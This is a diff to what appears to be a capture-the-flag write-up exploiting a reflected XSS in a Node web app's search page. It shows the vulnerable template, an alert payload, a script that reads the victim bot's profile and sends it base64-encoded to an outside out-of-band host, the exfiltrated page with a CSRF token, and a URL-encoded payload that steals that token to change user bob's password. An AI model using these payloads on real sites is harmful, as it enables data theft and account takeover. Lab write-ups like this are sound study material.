@@ -224,10 +224,144 @@ app.listen(80, () => {
 
 
 
+
 ---
 
 
 
+## here is we can inject xss here
+
+```javascript
+ const responseHTML = `
+        <html>
+        <head><title>Search Results</title></head>
+        <body>
+            <div id="results-header"></div>
+            <script>
+                var searchQuery = "${query}";
+                document.getElementById('results-header').innerHTML = '<h2>Search Results for "' + searchQuery + '"</h2>';
+            </script>
+            ${resultsHTML}
+            <br><a href="/shared">Back to Shared Area</a>
+        </body>
+        </html>
+    `;
+```
+
+
+
+
+
+
+
+
+
+
+---
+
+
+
+```
+'"</h2>';</script><script>alert(5)</script>
+http://3.252.72.221/search?query=%27%22%3C%2Fh2%3E%27%3B%3C%2Fscript%3E%3Cscript%3Ealert%285%29%3C%2Fscript%3E
+```
+
+
+<img width="1147" height="405" alt="image" src="https://github.com/user-attachments/assets/e4e16bd4-e08a-45d8-a549-8b8cf193cd0a" />
+
+
+
+
+## check first if paylaod send to bob
+
+```html
+</h2>';</script><script>
+fetch('http://localhost/profile', {method: 'GET', credentials: 'include'})
+  .then(r => r.text())
+  .then(data => {
+    
+    fetch('http://crudrnshcmhythtyywai7uanxa8alegy6.oast.fun/?p=' + btoa(data));
+  });
+</script>
+
+```
+
+
+**`response`**
+
+
+```
+GET /?p=PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8dGl0bGU+UHJvZmlsZTwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvc3R5bGUuY3NzIj4KPC9oZWFkPgo8Ym9keT4KICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGgyPldlbGNvbWUsIGJvYiE8L2gyPgogICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ii9wcm9maWxlIj4KICAgICAgPGxhYmVsPkJpbzo8L2xhYmVsPgogICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJfY3NyZiIgdmFsdWU9IjIwNjI1MWRiYjBmYzkyMThhYzIwYzM4MjJkZjA1NzQ1ODI4YzU3OWVhYTRjNjg3YjY3ZjIzZGNiNmZlZGVmZTgiPgogICAgICA8aW5wdXQgbmFtZT0iYmlvIiB2YWx1ZT0iSGVsbG8gZnJvbSBCb2IhIj48YnI+CiAgICAgIDxsYWJlbD5OZXcgUGFzc3dvcmQ6PC9sYWJlbD4KICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkxlYXZlIGJsYW5rIHRvIGtlZXAgY3VycmVudCI+PGJyPgogICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+VXBkYXRlPC9idXR0b24+CiAgICA8L2Zvcm0+CiAgICA8ZGl2IGNsYXNzPSJuYXYiPgogICAgICAgIDxhIGhyZWY9Ii9zaGFyZWQiPkdvIHRvIFNoYXJlZCBBcmVhPC9hPiB8CiAgICAgICAgPGEgaHJlZj0iL2xvZ291dCIgc3R5bGU9ImNvbG9yOiByZWQ7Ij5Mb2dvdXQ8L2E+CiAgICAgIDwvZGl2PgogIDwvZGl2Pgo8L2JvZHk+Cgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGgzPlJlcG9ydCBhIFVSTCBmb3IgQm9iIHRvIHZpc2l0PC9oMz4KICAgIDxmb3JtIG1ldGhvZD0iR0VUIiBhY3Rpb249Ii9yZXBvcnQiPgogICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXJsIiBwbGFjZWhvbGRlcj0iaHR0cDovL2xvY2FsaG9zdC9zb21ldGhpbmciIHJlcXVpcmVkPgogICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+UmVwb3J0IHRvIEJvYjwvYnV0dG9uPgogICAgPC9mb3JtPgo8L2Rpdj4KPC9odG1sPgo= HTTP/1.1
+Host: crudrnshcmhythtyywai7uanxa8alegy6.oast.fun
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Origin: http://localhost
+Referer: http://localhost/
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/140.0.0.0 Safari/537.36
+
+```
+
+
+> ### after decode the base64
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Profile</title>
+  <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+  <div class="container">
+    <h2>Welcome, bob!</h2>
+    <form method="POST" action="/profile">
+      <label>Bio:</label>
+      <input type="hidden" name="_csrf" value="206251dbb0fc9218ac20c3822df05745828c579eaa4c687b67f23dcb6fedefe8">
+      <input name="bio" value="Hello from Bob!"><br>
+      <label>New Password:</label>
+      <input type="password" name="password" placeholder="Leave blank to keep current"><br>
+      <button type="submit">Update</button>
+    </form>
+    <div class="nav">
+        <a href="/shared">Go to Shared Area</a> |
+        <a href="/logout" style="color: red;">Logout</a>
+      </div>
+  </div>
+</body>
+
+<div class="container">
+    <h3>Report a URL for Bob to visit</h3>
+    <form method="GET" action="/report">
+      <input type="text" name="url" placeholder="http://localhost/something" required>
+      <button type="submit">Report to Bob</button>
+    </form>
+</div>
+</html>
+
+```
+
+
+
+
+
+
+
+## change password of bob
+
+
+
+```
+http://localhost/search?query=%3C%2Fh2%3E%27%3B%3C%2Fscript%3E%3Cscript%3E%0Afetch(%27http%3A%2F%2Flocalhost%2Fprofile%27%2C%20%7B%0A%20%20method%3A%20%27GET%27%2C%0A%20%20credentials%3A%20%27include%27%20%0A%7D)%0A.then(r%20%3D%3E%20r.text())%0A.then(html%20%3D%3E%20%7B%0A%20%20%0A%20%20const%20parser%20%3D%20new%20DOMParser()%3B%0A%20%20const%20doc%20%3D%20parser.parseFromString(html%2C%20%27text%2Fhtml%27)%3B%0A%0A%20%20const%20token%20%3D%20doc.querySelector(%27input%5Bname%3D%22_csrf%22%5D%27).value%3B%0A%0A%20%20%0A%20%20const%20params%20%3D%20new%20URLSearchParams()%3B%0A%20%20params.append(%27_csrf%27%2C%20token)%3B%0A%20%20params.append(%27bio%27%2C%20%27Hacked%20by%20XSS%27)%3B%20%0A%20%20params.append(%27password%27%2C%20%27NewPass123%27)%3B%20%0A%0A%20%20%0A%20%20fetch(%27%2Fprofile%27%2C%20%7B%0A%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20headers%3A%20%7B%20%27Content-Type%27%3A%20%27application%2Fx-www-form-urlencoded%27%20%7D%2C%0A%20%20%20%20body%3A%20params.toString()%2C%0A%20%20%20%20credentials%3A%20%27include%27%0A%20%20%7D)%3B%0A%7D)%3B%0A%3C%2Fscript%3E%0A
+```
+
+
+
+
+```
+bob : NewPass123
+```
 
 
 
@@ -239,19 +373,13 @@ app.listen(80, () => {
 
 
 
+<img width="1663" height="695" alt="image" src="https://github.com/user-attachments/assets/a451eb7b-f684-46ba-9bb4-bb27022ca8e8" />
 
 
 
-
-
-
-
-
-
-
-
-
-
+```
+1a9a9b69e72fc58b2870ac167d948b00
+```
 
 
 
